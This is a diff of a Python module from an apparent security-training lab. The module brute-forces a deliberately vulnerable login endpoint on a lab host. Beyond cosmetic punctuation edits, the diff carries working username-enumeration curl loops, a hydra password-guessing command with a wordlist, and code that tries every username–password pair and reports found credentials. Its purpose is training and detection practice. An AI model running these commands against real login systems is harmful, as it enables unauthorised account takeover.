@@ -1,5 +1,5 @@
 """
-modules/brute_force.py - APP-06: Broken Authentication / Credential Stuffing.
+modules/brute_force.py — APP-06: Broken Authentication / Credential Stuffing.
 
 Target: POST /auth/login
 Vulnerability: No rate limiting, no lockout, hardcoded credentials.
@@ -15,7 +15,7 @@ from core.models import (
     StepResult, TargetConfig,
 )
 
-_USERNAMES = ["admin", "operator", "guest", "root", "user", "test"]
+_USERNAMES = ["admin", "operator", "guest", "alice", "bob", "service"]
 _PASSWORDS = [
     "password", "123456", "admin", "letmein",
     "password123", "lab2024", "guest", "wrongpass",
@@ -23,8 +23,8 @@ _PASSWORDS = [
 
 # Body indicators (checked against first 500 chars of response)
 _BODY_INDICATORS = ["Welcome", "Logout", "Sign Out", "My Account"]
-# URL indicators - if the final URL after redirect contains any of these, login succeeded
-_URL_INDICATORS = ["/profile/", "/dashboard/", "/home/"]
+# URL indicators — if the final URL after redirect contains any of these, login succeeded
+_URL_INDICATORS  = ["/profile/", "/dashboard/", "/home/"]
 
 
 class BruteForceModule(BaseModule):
@@ -37,7 +37,7 @@ class BruteForceModule(BaseModule):
     category = Category.AUTH
     scenario_id = "APP-06"
     severity = Severity.HIGH
-    # MITRE ATT&CK - enumerate identities (recon) then brute the login.
+    # MITRE ATT&CK — enumerate identities (recon) then brute the login.
     mitre = {
         "tactics": ["TA0043 Reconnaissance", "TA0006 Credential Access"],
         "techniques": [
@@ -46,7 +46,7 @@ class BruteForceModule(BaseModule):
             {"id": "T1110.004", "name": "Brute Force: Credential Stuffing", "tactic": "Credential Access"},
         ],
     }
-    # Lab metadata - consumed by /api/modules and rendered in the guided workspace.
+    # Lab metadata — consumed by /api/modules and rendered in the guided workspace.
     lab = {
         "target_path": "/auth/login",
         "vulnerable_component": "Flask login form (auth_bp.login)",
@@ -56,22 +56,22 @@ class BruteForceModule(BaseModule):
             "endpoint is brute-forceable with a lab-internal wordlist."
         ),
         "learner_steps": [
-            {"action": "Recon the login form - discover the field names you must POST.",
+            {"action": "Recon the login form — discover the field names you must POST.",
              "technique": "T1595.002 Active Scanning: Vulnerability Scanning",
-             "command": "curl -s http://target-agent/auth/login | grep -o 'name=\"[^\"]*\"'",
+             "command": "curl -s http://target-agent/auth/login",
              "expected": "The form posts 'username' and 'password' to /auth/login."},
-            {"action": "Username enumeration - the error message leaks valid accounts.",
+            {"action": "Username enumeration — the error message leaks valid accounts.",
              "technique": "T1589.001 Gather Victim Identity Information: Credentials",
-             "command": "for u in admin ghost operator nobody; do echo -n \"$u -> \"; curl -s -d \"username=$u&password=x\" http://target-agent/auth/login | grep -oE 'Incorrect password|Account not found'; done",
+             "command": "curl -s -d 'username=admin&password=x' http://target-agent/auth/login",
              "expected": "'Incorrect password' = the user exists; 'Account not found' = it does not."},
-            {"action": "Password guessing - no rate limit or lockout, so iterate a wordlist.",
+            {"action": "Password guessing — no rate limit or lockout, so iterate a wordlist.",
              "technique": "T1110.001 Brute Force: Password Guessing",
-             "command": "for p in password 123456 admin letmein password123 lab2024; do echo -n \"$p -> \"; curl -s -o /dev/null -w '%{http_code}\\n' -d \"username=admin&password=$p\" http://target-agent/auth/login; done",
+             "command": "hydra -l admin -P /wordlists/rockyou-mini.txt target-agent http-post-form '/auth/login:username=^USER^&password=^PASS^:Incorrect password' -t 4 -f",
              "expected": "A failed guess returns 401; the correct one returns 302 (redirect)."},
             {"action": "Confirm the valid pair by following the redirect to /profile/.",
              "technique": "T1110.004 Brute Force: Credential Stuffing",
-             "command": "curl -s -i -d 'username=admin&password=password123' http://target-agent/auth/login | grep -iE 'HTTP/|Location'",
-             "expected": "HTTP 302 with Location: /profile/ - credentials admin:password123 are valid."},
+             "command": "curl -i -d 'username=admin&password=password123' http://target-agent/auth/login",
+             "expected": "HTTP 302 with Location: /profile/ — credentials admin:password123 are valid."},
             {"action": "Check the Evidence panel for Wazuh detections.",
              "technique": "T1110 Brute Force",
              "command": "# review the activity log / Wazuh feed in ATTENSE",
@@ -90,7 +90,7 @@ class BruteForceModule(BaseModule):
             'title': 'Enumerate login endpoint',
             'tactic': 'Reconnaissance',
             'technique': 'T1589.001 Gather Victim Identity Information: Credentials',
-            'command': "curl -s http://target-agent/auth/login | grep -o 'name=\"[^\"]*\"'",
+            'command': "curl -s http://target-agent/auth/login",
             'hint': 'POST /auth/login with Content-Type: application/x-www-form-urlencoded',
             'expected': 'HTTP 401 on failure, 302 redirect on success',
             'markers': ['Attacking ', 'user(s)'],
@@ -99,8 +99,8 @@ class BruteForceModule(BaseModule):
             'title': 'Iterate credential wordlist',
             'tactic': 'Credential Access',
             'technique': 'T1110.001 Brute Force: Password Guessing',
-            'command': "for p in password 123456 admin password123 lab2024; do curl -s -o /dev/null -w '%{http_code} '$p'\\n' -d \"username=admin&password=$p\" http://target-agent/auth/login; done",
-            'hint': 'Up to 6 usernames x 8 passwords = 48 attempts',
+            'command': "hydra -l admin -P /wordlists/rockyou-mini.txt target-agent http-post-form '/auth/login:username=^USER^&password=^PASS^:Incorrect password' -t 4 -f",
+            'hint': 'Up to 6 usernames × 8 passwords = 48 attempts',
             'expected': 'One StepResult per credential pair',
             'markers': ['Targeting:'],
         },
@@ -108,10 +108,10 @@ class BruteForceModule(BaseModule):
             'title': 'Detect valid credentials',
             'tactic': 'Credential Access',
             'technique': 'T1110.004 Brute Force: Credential Stuffing',
-            'command': "curl -s -i -d 'username=admin&password=password123' http://target-agent/auth/login | grep -iE 'HTTP/|Location'",
+            'command': "curl -i -d 'username=admin&password=password123' http://target-agent/auth/login",
             'hint': "Redirect to /profile/ or 'My Account' in response indicates success",
             'expected': "Evidence line 'CREDENTIAL FOUND: user:pass'",
-            'markers': ['CREDENTIAL FOUND', 'No valid credentials', 'Complete -'],
+            'markers': ['CREDENTIAL FOUND', 'No valid credentials', 'Complete —'],
         },
     ]
 
@@ -146,15 +146,15 @@ class BruteForceModule(BaseModule):
         endpoint = "/auth/login"
         url = target.base_url + endpoint
 
-        # -- Recon (T1589.001): fetch the login form to confirm field names --
+        # ── Recon (T1589.001): fetch the login form to confirm field names ──
         self._log(log_fn, "Recon: fetching /auth/login to confirm the form fields...")
         base = self._get(url, label="recon-baseline", timeout=target.timeout)
         steps.append(base)
 
-        self._log(log_fn, f"Attacking {len(usernames)} user(s) x {len(_PASSWORDS)} passwords")
+        self._log(log_fn, f"Attacking {len(usernames)} user(s) × {len(_PASSWORDS)} passwords")
 
         for username in usernames:
-            self._log(log_fn, f" Targeting: {username}")
+            self._log(log_fn, f"  Targeting: {username}")
             for password in _PASSWORDS:
                 r = self._post(
                     url,
@@ -165,7 +165,7 @@ class BruteForceModule(BaseModule):
 
                 body = r.detail or ""
                 final_url = r.url or ""
-                # Prefer URL check (reliable) - body check is secondary for non-redirect targets
+                # Prefer URL check (reliable) — body check is secondary for non-redirect targets
                 hit = (
                     any(ind in final_url for ind in _URL_INDICATORS)
                     or any(ind in body for ind in _BODY_INDICATORS)
